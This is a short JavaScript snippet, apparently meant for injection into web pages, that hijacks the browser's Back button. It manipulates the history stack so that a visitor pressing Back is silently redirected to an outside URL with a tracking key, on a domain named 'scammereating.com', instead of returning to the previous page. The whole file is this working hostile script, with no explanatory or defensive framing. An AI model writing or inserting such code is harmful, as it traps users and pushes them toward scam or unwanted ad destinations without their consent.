(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://scammereating.com/adbt67z2za?key=ea25217dd62b1bc22fff588efd89bb7a");
    },0);
  }
}, false);
}(window, location));
